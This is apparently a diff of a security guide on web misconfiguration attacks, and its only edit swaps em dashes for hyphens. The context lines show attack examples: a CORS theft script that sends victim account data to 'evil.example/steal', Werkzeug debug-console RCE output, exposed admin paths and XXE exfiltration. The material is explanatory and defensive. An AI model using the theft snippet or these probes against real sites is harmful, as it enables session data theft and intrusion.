@@ -23,7 +23,7 @@
 
 ## The Core Attack Flow
 
-Misconfiguration is usually exploited through a low-effort, high-signal loop. There is rarely a bespoke exploit—the attacker enumerates the target until an insecure default answers back.
+Misconfiguration is usually exploited through a low-effort, high-signal loop. There is rarely a bespoke exploit-the attacker enumerates the target until an insecure default answers back.
 
 ```
   ENUMERATE            PROBE                 EXPLOIT              EXPAND
@@ -52,7 +52,7 @@ X-AspNet-Version: 4.0.30319              <-- framework version
 Set-Cookie: PHPSESSID=...; path=/        <-- tech stack confirmed
 ```
 
-**Impact**: An outdated `Server` banner is a shopping list—the attacker looks up CVEs affecting that exact version. Every disclosed version narrows the search from "the whole internet's exploits" to "the three that work here."
+**Impact**: An outdated `Server` banner is a shopping list-the attacker looks up CVEs affecting that exact version. Every disclosed version narrows the search from "the whole internet's exploits" to "the three that work here."
 
 ## 2. Default and Sample Credentials
 
@@ -82,7 +82,7 @@ Stack trace:
   DB DSN: mysql:host=db.internal;dbname=shop_prod;user=shop
 ```
 
-**Impact**: Reveals absolute file paths (useful for LFI/RFI and log poisoning), the database engine and schema, internal hostnames, and confirms an injection point—all from one malformed request.
+**Impact**: Reveals absolute file paths (useful for LFI/RFI and log poisoning), the database engine and schema, internal hostnames, and confirms an injection point-all from one malformed request.
 
 ## 4. Debug Mode / Interactive Console (RCE)
 
@@ -99,7 +99,7 @@ HTTP/1.1 500 INTERNAL SERVER ERROR
 'uid=33(www-data) gid=33(www-data)'
 ```
 
-**Impact**: Direct remote code execution as the web user—the single most severe outcome in this category. Django (`DEBUG=True`), Rails, Spring Boot devtools, and PHP with `display_errors` have their own equivalents of over-exposed debugging surface.
+**Impact**: Direct remote code execution as the web user-the single most severe outcome in this category. Django (`DEBUG=True`), Rails, Spring Boot devtools, and PHP with `display_errors` have their own equivalents of over-exposed debugging surface.
 
 ## 5. Directory Listing and Exposed Artifacts
 
@@ -115,7 +115,7 @@ GET /backup/ HTTP/1.1
   users_export.csv          2M
 ```
 
-**Impact**: Source code, database dumps, credentials, and PII downloaded directly—no authentication, no exploit. Attackers also brute-force common names (`feroxbuster`, `dirb`) to find directories not linked anywhere.
+**Impact**: Source code, database dumps, credentials, and PII downloaded directly-no authentication, no exploit. Attackers also brute-force common names (`feroxbuster`, `dirb`) to find directories not linked anywhere.
 
 ## 6. Exposed Admin, Sample, and Management Apps
 
@@ -128,7 +128,7 @@ Default installs and forgotten components leave management surfaces reachable:
 /console             /jenkins/script     /kibana/
 ```
 
-**Impact**: Database administration UIs, application servers, CI consoles, and monitoring dashboards frequently allow configuration changes, script execution, or credential disclosure—often with weak or default auth on top.
+**Impact**: Database administration UIs, application servers, CI consoles, and monitoring dashboards frequently allow configuration changes, script execution, or credential disclosure-often with weak or default auth on top.
 
 ## 7. Missing Security Headers
 
@@ -164,7 +164,7 @@ fetch('https://target.example/api/account', { credentials: 'include' })
   .then(data => navigator.sendBeacon('https://evil.example/steal', data));
 ```
 
-**Impact**: Silent cross-origin theft of account data, tokens, and anything the victim's session can read. (Browsers forbid the literal `*` with credentials, so vulnerable servers reflect the origin instead—equally dangerous.)
+**Impact**: Silent cross-origin theft of account data, tokens, and anything the victim's session can read. (Browsers forbid the literal `*` with credentials, so vulnerable servers reflect the origin instead-equally dangerous.)
 
 ## 9. Dangerous HTTP Methods
 
@@ -225,7 +225,7 @@ Merged into this category in 2021, XXE is exploitation of an XML parser *configu
 <!-- Exponential entity expansion exhausts memory -->
 ```
 
-**Impact**: Local file read, SSRF against internal services and cloud metadata, out-of-band data exfiltration, and denial of service—all from a parser that should have had DTDs disabled.
+**Impact**: Local file read, SSRF against internal services and cloud metadata, out-of-band data exfiltration, and denial of service-all from a parser that should have had DTDs disabled.
 
 ## 11. Public Cloud Storage and Broad IAM
 
@@ -263,7 +263,7 @@ Set-Cookie: session=abc123
 # Missing: SameSite -> sent cross-site, enabling CSRF
 ```
 
-**Impact**: Session hijacking via network sniffing or XSS, and cross-site request forgery—each a default flag away from being prevented.
+**Impact**: Session hijacking via network sniffing or XSS, and cross-site request forgery-each a default flag away from being prevented.
 
 ## 14. Exposed Version Control and Config Files
 
